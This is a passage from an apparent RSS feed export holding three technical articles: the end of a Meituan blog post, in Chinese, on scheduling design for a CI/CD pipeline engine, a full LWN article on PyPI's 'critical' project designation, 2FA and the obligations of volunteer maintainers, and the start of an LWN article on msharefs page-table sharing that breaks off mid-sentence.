referrerpolicy=\"no-referrer\"></p><p>在实际场景中，由于调度过程涉及链路长、各环节稳定性无法完全保证，容易产生因异常情况导致状态不流转的情况。为此，在设计上利用数据库保证状态变更的正确性，同时为非完结状态作业设立相应的补偿机制，确保任一环节异常后作业可以恢复正确流转。</p><p>我们重点从<strong>作业决策</strong>和<strong>作业拉取</strong>这两个关键过程来看状态流转过程可能出现的问题，以及在设计上是如何解决的。</p><p><strong>作业决策过程</strong>：任务中心接收调度作业的决策，将可调度的作业从unstart变为pending状态，同时将作业加入等待队列，等待被拉取。</p><p><img src=\"https://p1.meituan.net/travelcube/0d86af5b530d2cf53f788a136289d66d54492.png\" alt=\"图5 状态机-决策\" referrerpolicy=\"no-referrer\"></p><p><strong>未收到决策事件</strong>：由于决策者服务自身的问题或网络原因，导致决策事件的请求失败，作业长时间处于未调度状态。</p><ul><li>解决方案：引入定时监测的机制，对于无过程状态作业且处于未完结状态的流水线进行重新决策，避免决策服务短时间异常导致决策失败。</li></ul><p><strong>重复决策</strong>：由于网络延迟、消息重试现象可能出现多个决策者同时决策同一个作业，产生作业转移的并发问题。</p><ul><li>解决方案：增加pending的状态表示作业已被决策到，并通过数据库乐观锁机制进行状态变更，保证仅有一个决策会真正生效。</li></ul><p><strong>状态变更过程异常</strong>：由于存在异构数据库，状态变更和加入队列可能存在数据不一致，导致作业无法被正常调度。</p><ul><li>解决方案：采用最终一致性的方案，允许调度的短暂延迟。采用先变更数据库，再加入队列的操作顺序。利用补偿机制，定时监测队列队首的作业信息，若pending状态下的作业有早于队首作业的，进行重新入队操作。</li></ul><p><strong>作业拉取过程</strong>：任务中心根据Worker拉取作业的事件请求，从等待队列中获取待调度作业，将作业的状态从pending变更为scheduled，并返回给Worker。</p><p><img src=\"https://p0.meituan.net/travelcube/f5cc9da5aa8a29af29014ccafbcf8d8999788.png\" alt=\"图6 状态机-ACK\" referrerpolicy=\"no-referrer\"></p><p><strong>作业丢失问题</strong>：这里存在两种情况，①作业从队列中移除，但在状态将要变更时异常了；②作业从队列中移除，也正确变更了状态。但由于poll请求连接超时，未正常返回给Worker。</p><ul><li>解决方案：前者通过作业决策环节中对pending状态的作业补偿机制，重新加入队列；后者对于状态已变更的情况，已调度的作业增加ACK机制，若超时未确认，状态会流转回pending状态，等待被重新拉取。</li></ul><p><strong>作业被多个Worker拉取</strong>：Worker在接收到作业后，遇到长时间的GC，导致状态流转回pending状态，在Worker恢复后，可能出现作业已分配到另一个Worker上。</p><ul><li>解决方案：通过数据库乐观锁机制保证仅有一个Worker更新成功，并记录作业与Worker的关系，便于对作业进行中止以及Worker故障后的恢复操作。</li></ul><p><strong>3）决策过程</strong></p><p>决策过程是从所有未启动的作业中筛选出可以被调度的作业，通过一定的顺序将其提交给任务中心，等待被资源拉取的过程。整个筛选过程可以分为串并行顺序、条件过滤、优先级设置三部分。</p><p><img src=\"https://p0.meituan.net/travelcube/97847e8a75a70183d1b627d60c9ea80399713.png\" alt=\"图7 决策过程\" referrerpolicy=\"no-referrer\"></p><ul><li><strong>串并行顺序</strong>：相对于DAG中复杂的寻路场景，流水线场景比较明确，是将代码逐步加工验证，通过开发、测试、集成、上线等一系列阶段的过程。阶段间是严格串行的，阶段内出于执行效率的考虑，会存在串并行执行的情况。这里通过模型设计，将DAG的调度问题转变成作业的先后次序问题，引入<strong>run order</strong>概念，为每个组件作业设置具体的执行次序，根据当前已执行作业的次序，快速筛选出下一批次序仅大于当前的作业，若并行执行，仅需将作业的次序设置成相同即可。</li></ul><p><img src=\"https://p0.meituan.net/travelcube/0a1da147444b28a9b2e4d56467f61b0286749.png\" alt=\"图8 串并行决策\" referrerpolicy=\"no-referrer\"></p><ul><li><strong>条件过滤</strong>：随着业务场景扩展，不是所有的作业都需要调度资源，进行真正的执行。如某类耗时的组件，在代码和组件参数都不变的情况下，可以直接复用上一次的执行结果，或者在系统层面针对某类工具异常时进行组件跳过的降级操作。针对这类情况，在作业真正提交给任务中心之前，会增加一层条件判断（条件分为全局设置的系统条件以及用户条件），这些条件以责任链形式进行依次匹配过滤，根据匹配到的条件单独向任务中心提交决策。</li><li><strong>优先级设置</strong>：从系统全局考虑，在作业出现积压时，业务更关心核心场景下整条流水线是否能尽早执行完成，而不是单个作业的排队情况。所以，在优先级设置上除了基于<strong>时间戳的相对公平策略</strong>外，引入<strong>流水线类型的权重值</strong>（如发布流水线&gt;自测流水线；人工触发&gt;定时执行），保证核心场景流水线相关作业能够尽早被调度到。</li></ul><h3>4.2 资源池划分设计</h3><p><strong>1）整体方案</strong></p><p>我们采用多队列的设计，结合标签建立作业队列与资源池的匹配关系，以保障不同队列资源的有效划分，在出现队列积压、资源池故障、无可扩资源等情况时，最大限度地降低影响范围，避免所有作业全局排队等待的现象。</p><p><img src=\"https://p1.meituan.net/travelcube/94df06f861f63276c590b25e91ca4431319064.png\" alt=\"图9 资源池架构\" referrerpolicy=\"no-referrer\"></p><p><strong>2）模型关系</strong></p><p><img src=\"https://p0.meituan.net/travelcube/96e2d1ee493eb6972b4cf683ff67d4a355708.png\" alt=\"图10 资源池模型对象\" referrerpolicy=\"no-referrer\"></p><p><strong>作业队列与标签的关系</strong>：队列与标签采用1对1的关系，降低业务理解和运维成本。</p><ul><li>当队列积压时，能快速定位到某个标签没资源了。</li><li>标签资源不足时，也能快速判断影响的具体队列情况。</li></ul><p><strong>标签与资源池的关系</strong>：标签和资源池采用多对多的关系，主要从资源整体利用率和对核心队列的资源可用性保障考虑。</p><ul><li>对于一些作业量较少的队列，单独分配一个资源池会造成大部分时间资源是空闲状态，资源利用率低。我们通过给资源池打多标签的方式，既保证了队列有一定的资源配额，同时也能处理其他标签的作业，提高资源的利用率。</li><li>对于核心场景的队列，通常标签资源会分配到多个资源池上，保证资源的一定冗余，同时也降低单个资源池整体故障带来的影响。</li></ul><p><strong>3）标签设计</strong></p><p>标签的目的是建立资源（池）与作业（队列）的匹配关系。在设计上，为便于标签管理和后期维护，我们采用二维标签的形式，通过组件和流水线两个维度，共同决定一个作业所属标签及对应的资源。</p><ul><li><strong>第一维度</strong>：组件维度，对资源做通用划分。结合组件的业务覆盖情况、作业执行量、对机器和环境的特殊要求（如SSD、Dev环境等），对需要独立资源的组件进行打标，划分出不同的公共资源池（每个公共资源池执行一类或多类组件作业），在引擎层面统一分配，保证所有作业都有可正常运行。</li><li><strong>第二维度</strong>：流水线维度，根据业务场景进行划分。结合业务对资源隔离/作业积压敏感度的诉求，按需进行划分。有些希望资源完全独立的业务，会从所有的公共资源池进行切分；有些仅对部分核心场景下的资源需要保障，根据链路上涉及的组件，选择性地从部分公共资源池进行划分，实现业务隔离和资源利用率的平衡。</li></ul><blockquote><p>注：每个维度都会设一个other的默认值用来兜底，用于处理无资源划分需求的场景。</p></blockquote><p><img src=\"https://p0.meituan.net/travelcube/382508f39bc625bfdc4fb44c4fd51afe146951.png\" alt=\"图11 标签设计\" referrerpolicy=\"no-referrer\"></p><p><strong>4）队列拆分设计</strong></p><p>根据作业所属标签不同拆分出多个队列，保证每个队列的独立性，降低作业积压的影响范围。整个拆分过程可以分为入队和出队两部分：</p><ul><li><strong>入队过程</strong>：通过计算作业在组件和流水线两个维度的属性值，来确定作业对应的标签。结合模型关系中标签与队列（1对1）的关系，为每个标签按需创建一个队列，存储该标签作业，不同队列间作业做排他处理，简化出队的实现复杂度。</li><li><strong>出队过程</strong>：队列拆分后，因为标签和资源池（多对多）的关系，资源池的一次作业拉取请求往往会涉及多个队列。出于拉取效率的考虑，采用轮询的方式依次对单队列进行出队操作，直到达到该次请求的作业数上限或所有可选队列为空时返回结果。该方式可以<strong>避免同时对多个队列加锁</strong>，并且在前置环节会<strong>对多标签进行随机排序</strong>，降低多个请求同时操作一个队列的竞争概率。</li></ul><p><img src=\"https://p1.meituan.net/travelcube/86f3721bbf0ee9b749871832699af271212509.png\" alt=\"图12 队列拉取设计\" referrerpolicy=\"no-referrer\"></p><h3>4.3 组件分层设计</h3><p><strong>1）分层架构</strong></p><p><img src=\"https://p0.meituan.net/travelcube/2fb7dab8c09c6add38ec88ac927e0b9e213413.png\" alt=\"图13 组件架构设计\" referrerpolicy=\"no-referrer\"></p><ul><li><strong>业务层</strong>：引入适配层，满足组件开发中多样化的需求场景，同时避免上层差异污染到下层。</li><li><strong>系统交互层</strong>：设立统一的流程标准，保证引擎和组件交互过程的一致性，便于统一处理非功能性的系统优化。</li><li><strong>执行资源层</strong>：提供多种资源策略，向上层屏蔽不同资源类型的差异。</li></ul><p><strong>2）标准的交互流程设计</strong></p><p>在系统交互层，组件与引擎交互的过程中，有两个环节是确定的，①组件作业的状态机流转，这涉及到组件执行的整个生命周期管理，若允许存在不同的状态流转关系，整个管理过程会十分混乱；②引擎对外提供的接口范围，从服务间解耦的角度，对外提供的接口主要是组件作业维度的接口操作，不应该耦合任何组件内部的实现细节。</p><p>结合作业状态机 + 引擎提供的接口，确定了组件执行基本的系统交互流程。利用模版模式，抽象出<code>init()</code>、<code>run()</code>、<code>queryResult()</code>、<code>uploadArtifacts()</code> 等<strong>必要方法</strong>供业务实现，整个交互流程则由系统统一处理，业务无需关心。</p><p><img src=\"https://p0.meituan.net/travelcube/fe5bc656c37434629144ac4d0647e3f4228820.png\" alt=\"图14 组件标准流程设计\" referrerpolicy=\"no-referrer\"></p><p><strong>3）扩展基础能力</strong></p><p>组件执行除了正常的执行流程外，随着业务场景的丰富，还会涉及组件中止、回调（人工审批场景）等操作，这些操作的引入势必会改变原先的交互流程。为了不增加额外的交互复杂度，在拉取作业环节，<strong>增加作业的事件类型</strong>（运行、中止、回调等事件），Worker根据拉取到的不同事件，执行相应的扩展逻辑。同时，引入新的扩展也不会影响到已有的交互流程。</p><p><img src=\"https://p0.meituan.net/travelcube/72fafafecd96e8f2e517aa5b2a3eb1b1148695.png\" alt=\"图15 组件扩展能力设计\" referrerpolicy=\"no-referrer\"></p><p>基于上述扩展，我们可能更好地将一些通用能力下沉到Daemon Thread层。如结果查询流程，通过守护线程的方式，取消了原先同步等待的查询限制，这对于需要异步化处理的场景（如组件作业逻辑已执行完，仅在等待外部平台接口返回结果）可以提前释放资源，提高资源执行的利用率。并且，当执行资源故障重启后，结果查询线程会自动恢复待处理异步作业。这部分能力的支持在业务层是透明的，不改变整个交互流程。</p><p><strong>4）引入适配器</strong></p><p>业务虽可以通过必要方法完成自定义组件，但这些方法过于基础，业务在一些特定场景下实现成本较高。如对于组件支持Shell的脚本化调用，业务其实仅需提供可执行的Shell即可，通用约定的方式，其他必要方法的实现都可以交由系统完成。</p><p>针对业务个性化的处理，采用适配器模式，通用引入不同Command（ShellCommand、xxCommand）来默认实现特定场景下的必要方法，降低业务的开发成本。同时，保持系统侧流程的一致性，通过<strong>动态注入 Command</strong>的方式，防止对业务个性化处理的耦合。</p><p><img src=\"https://p0.meituan.net/travelcube/008e15dbccbc7b0e895dbcfd6c168081208244.png\" alt=\"图16 组件适配器设计\" referrerpolicy=\"no-referrer\"></p><p><strong>5）效果</strong></p><p>目前已支持Shell组件、服务组件、容器组件等多种接入方式，平台上已提供<strong>数百个组件</strong>，组件开发方涉及<strong>数十个业务线</strong>。组件库覆盖源码域、构建域、测试域、部署域、人工审批域等多个环节，打通了研发过程所涉及的各个基础工具。</p><p><img src=\"https://p0.meituan.net/travelcube/e0ba883e4ca81c753af4a37b856a6e2a431989.png\" alt=\"图17 组件库\" referrerpolicy=\"no-referrer\"></p><h2>5. 后续规划</h2><ul><li>借助Serverless等云原生技术，探索更轻量、高效的资源管理方案，提供更精细化的资源策略，从资源的弹性、启动加速、环境隔离三个方面为业务提供更优的资源托管能力。</li><li>面向组件开发者，提供从开发、上线到运营的一站式开发管理平台，降低组件开发、运营成本，使更多工具方、个人开发者能参与其中，共同打造丰富多样的业务场景，形成良性的组件运营生态。</li></ul><h2>6. 本文作者</h2><p>耿杰、春晖、志远等，来自研发质量与效率部研发平台团队。</p><h2>招聘信息</h2><p>美团研发质量及效率部，负责公司研发效能领域平台和工具的建设（包括研发需求管理工具、CI/CD流水线、分布式代码仓库、多语言构建工具、发布平台、测试环境管理平台、全链路压测平台等），致力于不断推进优秀的研发理念和工程实践，建设一流的工程基础设施。我们长期招聘高级、资深技术专家，Base北京、上海。感兴趣的同学可以将简历发送至gengjie02@meituan.com（邮件主题：美团研发质量及效率部）。</p>"
    },
    "origin": {
        "streamId": 13,
        "title": "美团技术团队",
        "htmlUrl": "https://tech.meituan.com/feed/",
        "feedUrl": "https://rsshub.black-desk.cn/meituan/tech/home"
    }
},
{
    "id": "900953",
    "timestampUsec": "1658160616314571",
    "categories": [
        "user/-/state/com.google/read",
        "user/-/state/com.google/starred"
    ],
    "title": "&quot;Critical&quot; projects and volunteer maintainers",
    "author": ";jake",
    "published": 1657746060,
    "updated": 1657746060,
    "alternate": [
        {
            "href": "https://lwn.net/Articles/900953/",
            "type": "text/html"
        }
    ],
    "content": {
        "content": "<div>\n           By <b>Jake Edge</b><br>July 13, 2022\n           </div>\n<p>\nOver the last five decades or so, free and open-source software (FOSS) has\ngone from an almost unknown \nquantity available to only the most technically savvy to underpinning much\nof the infrastructure we rely on today.  Much like software itself, FOSS is\n\"eating the world\".  But that has changed—is changing—the role of the\nmaintainers of all of that code; when \"critical\" infrastructure uses code\nfrom a FOSS project, suddenly, and perhaps without warning, that code\nitself becomes critical.  But many maintainers of that software are\nvolunteers who did not set out to become beholden to the needs of large\ncompanies and organizations when they released their code, they were just\nscratching their itch—now lots of others are clamoring for theirs to be\nscratched as well.  \n</p>\n\n<p>\nThe supply-chain security problem is clearly a serious one that needs\nto be addressed.  The <a href=\"https://lwn.net/Articles/878570/\">Log4j incident</a>\nprovides a recent example of how a security vulnerability in a fairly small\ncomponent can ripple out across the internet by way of dependency chains.\nSome projects depended directly on Log4j, but many others became\nvulnerable because they were using some <i>other</i> library or package\nthat depended on Log4j—directly or indirectly.\n</p>\n\n<p>\nSome of the places where dependency chains are often lengthy, and thus more\nvulnerable to the intentional injection of malware, are various\nlanguage-specific repositories of packages.  Sites like the <a href=\"https://pypi.org/\">Python Package Index</a> (PyPI) provide a huge\npalette of components that can be used by applications or other libraries.\nThe <tt>pip</tt> tool that comes with Python will happily install PyPI\npackages along with all of their dependencies, recursively.  Many other\nlanguages have similar repositories and tooling.\n</p>\n\n<h4>Critical components</h4>\n\n<p>\nThere are multiple efforts these days to identify the most critical\ndependencies and to provide assistance to those projects so that they do\nnot end up in the <a href=\"https://lwn.net/Articles/702751/\">position of a pre-Heartbleed\nOpenSSL</a>—or represent that one project in the <a href=\"https://xkcd.com/2347/\">classic xkcd</a>. For example, the <a href=\"https://openssf.org/\">Open \nSource Security Foundation</a> (OpenSSF) has its <a href=\"https://openssf.org/community/alpha-omega/\">Alpha-Omega project</a>\nthat is identifying projects needing assistance with their security.\nPyPI has also been identifying its packages that have been downloaded the\nmost over the last six months based on its <a href=\"https://warehouse.pypa.io/api-reference/bigquery-datasets.html\">public\ndata sets</a>; those that are in the top 1% are deemed \"critical\".  Roughly\n3500 projects have been identified in this manner and the maintainers of those projects\nare being <a href=\"https://pypi.org/security-key-giveaway/\">offered a free\nsecurity key</a> to help them set up <a href=\"https://en.wikipedia.org/wiki/Multi-factor_authentication\">two-factor\nauthentication</a> (2FA) for their PyPI accounts.\n</p>\n\n<p>\nAuthentication using 2FA is not currently required for any packages, but\nPyPI plans to require it for maintainers of critical projects \"<q>in the\ncoming months</q>\".  Once that goes into effect, maintainers who have not\nenabled 2FA (using a security key or <a href=\"https://en.wikipedia.org/wiki/Time-based_one-time_password\">time-based\none-time password</a> (TOTP) application) will presumably not be able to\nmake changes, such as updating the package.  That, of course, has its own\nrisk, in that a critical package may not be able to get the update it needs\nfor some serious vulnerability because its maintainers failed to sign up\nfor 2FA.\n</p>\n\n<p>\nOn July 8, Skip Montanaro <a href=\"https://discuss.python.org/t/a-defunct-project-of-mine-has-been-categorized-as-critical/17219\">posted</a>\na message to the Python discussion forum noting that a defunct project of\nhis, <a href=\"https://pypi.org/project/lockfile/\">lockfile</a>, had been\nidentified as critical.  The project had been marked as deprecated at the\ntop of its <tt>README</tt> (with alternatives listed) and has\nnot seen any releases since 2015.  He wondered why it was considered\ncritical and asked: \"<q>What should I do to get rid of this designation?</q>\"\n</p>\n\n<p>\nDonald Stufft <a href=\"https://discuss.python.org/t/a-defunct-project-of-mine-has-been-categorized-as-critical/17219/2\">said</a>\nthat the package is being downloaded roughly 10-million times per month.\nDustin Ingram pointed to the FAQ in the security-key giveaway announcement\nthat says \"<q>once the project has been designated as critical it retains\nthat designation indefinitely</q>\", so lockfile will be considered critical\nhenceforth. The lockfile module is part of the <a href=\"https://www.openstack.org/\">OpenStack project</a>; the\n<tt>README</tt> file for lockfile suggests contacting the openstack-dev\nmailing list for assistance in moving away from it.\n</p>\n\n<p>\nIt turns out that \"<q>no OpenStack projects declare direct dependencies on lockfile since\nMay 2015</q>\", <a href=\"https://discuss.python.org/t/a-defunct-project-of-mine-has-been-categorized-as-critical/17219/6\">according\nto \"fungi\"</a>, who is a system administrator for OpenStack.   But\n lockfile is still used by parts of the OpenStack project.\nIn a perfect demonstration of the insidious nature of dependency chains,\nfungi <a href=\"https://discuss.python.org/t/a-defunct-project-of-mine-has-been-categorized-as-critical/17219/11\">tracked down its use</a> by the project:\n</p><blockquote>\nI've found that some OpenStack projects depend on ansible-runner,\nwhich in turn depends on python-daemon, which itself declares a\ndependency on lockfile. I'll need to confer with other contributors\non a way forward, but probably it's to either help python-daemon\nmaintainers replace their use of lockfile, or help ansible-runner\nmaintainers replace their use of python-daemon.\n</blockquote>\n<p></p>\n\n<p>\nSo most or all of the downloads of this \"critical\" PyPI project are\nprobably for continuous-integration testing of OpenStack  and the\ncomponents that use lockfile should likely have replaced it with something\nelse nearly eight years ago.  Hugo van Kemenade <a href=\"https://discuss.python.org/t/a-defunct-project-of-mine-has-been-categorized-as-critical/17219/12\">suggested</a>\nencouraging people to stop using it; \"<q>if you're still in a position to\nrelease, emit a DeprecationWarning on import suggesting the\nreplacements. Or something noisier like a UserWarning.</q>\" Paul Moore <a href=\"https://discuss.python.org/t/a-defunct-project-of-mine-has-been-categorized-as-critical/17219/13\">noted</a>\nthat marking it as deprecated did not work, nor did ceasing releases\nin 2015; \"<q>I'm not at all sure 'tell people not to use it' is a\nviable strategy for getting marked as 'not critical'.</q>\" \n</p>\n\n<h4>Opinions</h4>\n\n<p>\nOn July 9, Armin Ronacher <a href=\"https://lucumr.pocoo.org/2022/7/9/congratulations/\">posted</a> his\nthoughts about PyPI's 2FA requirement; that post was extensively discussed\n<a href=\"https://lwn.net/Articles/900671/\">here at LWN</a>, <a href=\"https://news.ycombinator.com/item?id=32037562\">at Hacker News</a>,\nand elsewhere.  Ronacher makes it clear that he does not see 2FA as an\nunreasonable burden for maintainers of PyPI projects, but he does wonder\nwhere it all leads.  For one thing, it is, apparently, only critical\npackages at PyPI that will be required to have 2FA set up, so \"<q>clearly\nthe index [PyPI] considers it burdensome enough to not enforce it for everybody</q>\".\n</p>\n\n<p>\nThat creates something of a double standard.  As Ronacher put it, he did\nnot set out to  create a critical package, that was something that happened\norganically.  But the kinds of problems that can be prevented through 2FA,\nsuch as a malicious actor logging into PyPI with stolen credentials, can\nhappen with any package, not just popular ones. \"<q>In theory that type of\nprotection really should apply to every package.</q>\" \n</p>\n\n<p>\nBut there is also a question of what <i>else</i> might be required down the\nroad.  When the projects at PyPI today were created, there was no mention\nof 2FA, so other things may be added down the road as well.  \n</p><blockquote>\nThere is a hypothetical future where the rules tighten. One could imagine\nthat an index would like to enforce cryptographic signing of newly released\npackages. Or the index wants to enable reclaiming of critical packages if\nthe author does not respond or do bad things with the package. For instance\na critical package being unpublished is a problem for the ecosystem. One\ncould imagine a situation where in that case the Index maintainers take\nover the record of that package on the index to undo the damage. Likewise\nit's more than imaginable that an index of the future will require packages\nto enforce a minimum standard for critical packages such as a certain SLO\n[service level objective] for responding to critical incoming requests (security, trademark laws etc.).\n</blockquote>\n<p></p>\n\n<p>\nSome of those\nrequirements make perfect sense from a security standpoint; in fact, some should\nperhaps be in place already.  But there is now an ongoing <a href=\"https://discuss.python.org/t/stop-allowing-deleting-things-from-pypi/17227\">discussion</a>\nabout disallowing projects from being deleted from PyPI.  Obviously\ndeleting a project that other projects rely on is kind of an antisocial\nact, but it does seem like something the author (and probably copyright\nholder) should be allowed to do.  It can lead to chaos like the <a href=\"https://lwn.net/Articles/681410/\">famous left-pad fiasco</a>, however.  \n</p>\n\n<p>\nThe\nrecent 2FA push from PyPI led a maintainer to <a href=\"https://github.com/untitaker/python-atomicwrites/issues/61\">accidentally\nremove all of the old releases</a> of the <a href=\"https://pypi.org/project/atomicwrites/\">atomicwrites</a> package.  As\nnoted by Stufft in the PyPI deletion discussion linked above, he restored\nthe atomicwrites releases at the request of the maintainer, but \"<q>it took\nabout an hour to restore 35 files</q>\".   Finding a way to head off those\nkinds of mistakes would be useful in addition to preventing downstream\nchaos when a maintainer deletes their project.\n</p>\n\nAs Ronacher noted, he is using the resources of PyPI for the distribution\nof his projects, so he is willing to follow its rules, which are aimed at\nprotecting the users of the index.  But PyPI (and other similar\nrepositories for other languages) have something close to a monopoly over\nproject distribution, since <tt>pip</tt> is tied to it.  He wondered if a\nsolution along the lines of the <a href=\"https://lwn.net/Articles/897435/\"><tt>cargo vet</tt> tool</a> for Rust might\nmean that package indexes can get out of the job of enforcing security\npolicies and to leave it to others to do so:\n<blockquote>\nWhat I like about the <tt>cargo-vet</tt> approach is that it separates the\nconcerns of running an index from vetting. It also means that in theory\nthat multiple competing indexes could be provided and vetting can still be\ndone. Most importantly it puts the friction of the vetting to the community\nthat most cares about this: commercial users. Instead of Open Source\nmaintainers having to jump through more hoops, the vetting can be\noutsourced to others. Trusted \"Notaries\" could appear that provide vetting\nfor the most common library versions and won't approve of a new release\nuntil it undergoes some vetting. \n</blockquote>\n\n<h4>Reaction</h4>\n\n<p>\nDjango developer James Bennett had a <a href=\"https://www.b-list.org/weblog/2022/jul/11/pypi/\">sharply worded\nreply</a> to Ronacher on July 11 (which was also <a href=\"https://news.ycombinator.com/item?id=32061428\">discussed at Hacker\nNews</a> and no doubt elsewhere).  In much of it, Bennett seems to\nbe reacting to the arguments that others are making, rather than those that\nRonacher made.  But Bennett's main complaint with Ronacher is that he thinks\nthe <tt>cargo vet</tt> approach is flawed and that those who release\nFOSS have a responsibility to users in an \"<q>ethical and social sense</q>\", even\nthough any legal responsibility has been disclaimed in the\nlicense. \"<q>Yeah, if you publish open-source code you do have some\nresponsibilities, whether you want them or not.</q>\" \n</p>\n\n<p>\nBennett's list of responsibilities for a FOSS maintainer seem generally\nreasonable, \"<q>because what they really boil down to is the basic societal\nexpectation of 'don't be an asshole'</q>\".  But he is raising a strawman\nhere, since Ronacher never argued that maintainers should be \n(allowed to be)\nassholes.  Ronacher simply wondered what other requirements might be\nimposed on maintainers over time, some of those that he mentioned\n(e.g. a service level objective) would be quite\nonerous for a volunteer maintainer. \n</p>\n\n<p>\nBennett's weakest argument seems to be that Ronacher owes more to his users\nthan he might voluntarily choose to give because his work on FOSS has\nopened various doors for him.  It is a fairly strange argument, in truth.\nOverall, Bennett seems to be addressing lots of things that Ronacher did\nnot say, or even imply.  The heart of what Ronacher was trying to do was to\ntry to figure out where the boundaries are, not to claim they had already\nbeen crossed.\n</p>\n\n<p>\nIt seems vanishingly unlikely that PyPI will be establishing two-day\nsecurity-fix timelines, for example, on its critical projects, but there\nare surely lots of companies and other organizations out there that wish it\nwould. There is a general tendency for all humans (and their constructs\nlike companies) to shirk responsibilities if they can find another to pin\nthem on.  Companies and organizations that are shipping software that is dependent on the\nFOSS supply chain need to be deeply involved in ensuring that the code is secure.\n</p>\n\n<p>\nDoing that work will cost a lot of money and take a lot of time.  We are\nseeing efforts to do that work, and the PyPI 2FA requirement is one of\nthose pieces.  It is hardly a panacea, but it is a useful step.  \n</p>\n\n<p>\nAs Luis Villa <a href=\"https://opensource.com/article/21/8/open-source-maintainers\">noted</a>\nlast year, FOSS maintainers are being asked to do more and more things;\noften they are being asked to do so without any compensation, though\nperhaps \"doors opening\" counts to a limited extent.   As more critical\nprojects are identified, it is likely we will see more conflicts of this\nnature.  What happens when a maintainer does not want to follow the\nrecommendations of OpenSSF (or some other similar effort) on changes?\nForks are generally seen as a hostile move, but one suspects that may\nultimately happen for projects that find themselves at odds with sponsoring\norganizations.  That is a rather different world than the one FOSS grew up in.\n</p><br clear=\"all\"><div>\n               <table align=\"right\"><tbody><tr><td>\n               \n               \n               \n               </td></tr></tbody></table>\n               </div>\n               <br clear=\"all\">\n               <table align=\"right\"><tbody><tr><td>\n           \n           \n           </td></tr></tbody></table>\n           <br clear=\"all\">\n           <p>\n           \n</p>"
    },
    "origin": {
        "streamId": 22,
        "title": "LWN.net",
        "htmlUrl": "https://lwn.net/",
        "feedUrl": "http://lwnfeed:8080/feed.rss"
    }
},
{
    "id": "901059",
    "timestampUsec": "1658160616314580",
    "categories": [
        "user/-/state/com.google/read",
        "user/-/state/com.google/starred"
    ],
    "title": "Sharing page tables with msharefs",
    "author": ";corbet",
    "published": 1657894440,
    "updated": 1657894440,
    "alternate": [
        {
            "href": "https://lwn.net/Articles/901059/",
            "type": "text/html"
        }
    ],
    "content": {
        "content": "<div>\n           By <b>Jonathan Corbet</b><br>July 15, 2022\n           </div>\nA page-table entry (PTE) is relatively small, requiring just eight bytes to refer to a\n4096-byte page on most systems.  It thus does not seem like a worrisome\nlevel of overhead, and little effort has been made over the kernel's\nhistory to reduce page-table memory consumption.  Those eight bytes can\nhurt, though, if they are replicated across a sufficiently large set of\nprocesses.  The <a href=\"https://lwn.net/ml/linux-mm/cover.1656531090.git.khalid.aziz@oracle.com/\">msharefs\npatch set</a> from Khalid Aziz is a revised attempt to address that\nproblem, but it is proving to be a hard sell in the memory-management\ncommunity.\n<p>\nOne of the defining characteristics of a process on Linux (or most other\noperating systems) is a distinct address space.  As a result, the page\ntables that manage the state of that address space are private to each\nprocess (though threads within a process will share page tables).  So if\ntwo processes have mappings to the same page in physical memory, each will\nhave an independent page-table entry for that page.  The overhead for\nPTEs, thus, increases linearly with the number of processes\nmapping each page.\n</p><p>\nEven so, this cost is not normally problematic, but there is always\nsomebody out there doing outlandish things.  As described in the cover\nletter from the patch series:\n</p><p>\n</p><blockquote>\n\tOn a database server with 300GB SGA [<a href=\"https://docs.oracle.com/database/121/ADMQS/GUID-A3319550-AB7A-4429-9A58-4B90E4B3D0F5.htm\">Oracle\n\tsystem global area</a>], a system crash was seen with\n\tout-of-memory condition when 1500+ clients tried to share this SGA\n\teven though the system had 512GB of memory. On this server, in the\n\tworst case scenario of all 1500 processes mapping every page from\n\tSGA would have required 878GB+ for just the PTEs. If these PTEs\n\tcould be shared, the amount of memory saved is very significant.\n</blockquote>\n<p>\nSharing those PTEs is the objective of this work, which was <a href=\"https://lwn.net/Articles/895217/\">discussed</a> at the Linux Storage, Filesystem,\nMemory-Management, and BPF Summit in May.  At that time, Aziz was proposing\na new system call (<tt>mshare()</tt>) to manage this sharing.  The current\npatch set has changed this interface and now requires no new system calls\nat all.\n</p><p>\nEven without the system call,\nit is still necessary for processes to explicitly request the sharing of\npage tables for a range of memory.  The current patch set provides yet\nanother kernel virtual filesystem — msharefs — for that purpose; it is\nexpected to be mounted on <tt>/sys/fs/mshare</tt>.  The file\n<tt>mshare_info</tt> in that filesystem will, when read, provide the\nminimum alignment required for a memory region to be able to share page tables.\n</p><p>\nThe next step is to create a file under <tt>/sys/fs/mshare</tt> with a name\nthat means something to the application.  Then, an <a href=\"https://man7.org/linux/man-pages/man2/mmap.2.html\"><tt>mmap()</tt></a>\ncall should be used to map that file into the process's address space.  The\nsize passed to <tt>mmap()</tt> will determine the size of the resulting\nshared region of memory.  Your editor's reading of the code suggests that\nproviding an explicit address for the mapping is advisable; there does not\nappear to be any mechanism to automatically pick an address that meets the\nalignment requirements.\nOnce the region has been mapped, it can be used\njust like any other memory range.\n</p><p>\nThe purpose of creating such a region is to allow other processes to map it\nas well.  Any other processes will need to start by opening the msharefs\nfile created by the first process, then reading a structure of this type\nfrom it:\n</p><p>\n</p><pre>    struct mshare_info {\n\tunsigned long start;\n\tunsigned long size;\n    };\n</pre>\n<p>\nThe <tt>start</tt> and <tt>size</tt> fields provide the address at which\nthe region is mapped and its size, respectively; the new process should\npass those values (and the opened msharefs file) to its own <tt>mmap()</tt>\ncall to map the shared region.  After that, the region will be mapped just\nlike any other shared-memory area — with a couple of important exceptions,\nas will be described below.\n</p><p>\nA process's address space is described by <a href=\"https://elixir.bootlin.com/linux/v5.18.11/source/include/linux/mm_types.h#L476\"><tt>struct\nmm_struct</tt></a>; there is one such structure for each process (other than\nkernel threads) in the system.  The msharefs patch set changes the\nlongstanding one-to-one relationship between this structure and its owning\nprocess by creating a new <tt>mm_struct</tt> structure for each shared\nregion.  The page tables describing this region belong to this separate\nstructure, rather than to any process's <tt>mm_struct</tt>.  Whenever a\nprocess maps this region, the associated <a href=\"https://elixir.bootlin.com/linux/v5.18.11/source/include/linux/mm_types.h#L393\"><tt>vm_area_struct</tt></a>\n(VMA) will contain a pointer to this special <tt>mm_struct</tt>.  The end\nresult is that all processes mapping this area will share not just the\nmemory, but also the page tables that go along with it.\n</p><p>\nThat saves the memory that would have gone into duplicate page tables, of\ncourse, but it also has a couple of other, possibly surprising, results.\nFor example, changing the protection of memory within that region with <a href=\"https://man7.org/linux/man-pages/man2/mprotect.2.html\"><tt>mprotect()</tt></a>\nwill affect all processes sharing the area; with ordinary shared memory,\nonly the calling process will see protection changes.  Similarly, the\nmemory region can be remapped entirely with <a 